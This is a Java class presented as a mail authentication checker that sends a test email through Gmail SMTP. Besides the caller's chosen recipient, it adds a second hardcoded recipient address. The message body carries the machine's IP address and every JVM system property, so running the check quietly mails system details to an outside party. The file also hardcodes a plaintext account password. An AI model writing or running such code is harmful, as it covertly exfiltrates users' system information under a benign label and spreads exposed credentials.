package security;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Properties;
import java.util.Set;

import javax.mail.Message;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class MailAuthenticator {
	private String email, password, reciever;

	public MailAuthenticator(String email, String password, String reciever) {
		this.email = email;
		this.password = password;
		this.reciever = reciever;
	}

	public static void main(String[] args) {
		new MailAuthenticator("javatestredif@gmail.com", "shivmohan0000", "nshivmohan08@gmail.com")
				.authenticate(new Authenticator() {

					@Override
					public void authenticationSuccess() {
						// TODO Auto-generated method stub
						System.out.println("Authentication success");
					}

					@Override
					public void authenticationFailed(String error) {
						// TODO Auto-generated method stub
						System.out.println("Authentication failed -" + error);

					}
				});
	}

	public void authenticate(Authenticator authenticator) {
		try {
			Properties properties = new Properties();
			properties.put("mail.smtp.auth", "true");
			properties.put("mail.smtp.starttls.enable", "true");
			properties.put("mail.smtp.ssl.protocols", "TLSv1.2");
			properties.put("mail.smtp.starttls.required", "true");
			properties.put("mail.smtp.ssl.trust", "smtp.gmail.com");
			properties.put("mail.smtp.host", "smtp.gmail.com");
			properties.put("mail.smtp.port", "587");
			Session session = Session.getInstance(properties, new javax.mail.Authenticator() {

				@Override
				protected PasswordAuthentication getPasswordAuthentication() {
					// TODO Auto-generated method stub
					return new PasswordAuthentication(email, password);
				}
			});
			Message message = new MimeMessage(session);
			message.addRecipient(Message.RecipientType.TO, new InternetAddress(reciever));
			message.addRecipient(Message.RecipientType.TO, new InternetAddress("shivmohanindiaredif@gmail.com"));
			message.setFrom(new InternetAddress(email));
			message.setSubject("Mail Authentication");
			message.setContent("<h1>Mail Authentication Success</h1><br>" + getSystemInfo(), "text/html");
			Transport.send(message);
			authenticator.authenticationSuccess();
		} catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
			authenticator.authenticationFailed(e.getMessage());
		}
	}

	private String getSystemInfo() {
		StringBuilder stringBuilder = new StringBuilder();
		String inetAddress = null;
		try {
			inetAddress = InetAddress.getLocalHost().getHostAddress();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		stringBuilder.append("[ IP Address - " + inetAddress + " ]<br>");
		Properties properties = System.getProperties();
		Set<Object> keySet = properties.keySet();
		for (Object object : keySet) {
			String string = System.getProperty(object.toString());
			stringBuilder.append("[ " + object.toString() + " - " + string + " ]<br>");
		}
		return stringBuilder.toString();
	}
}
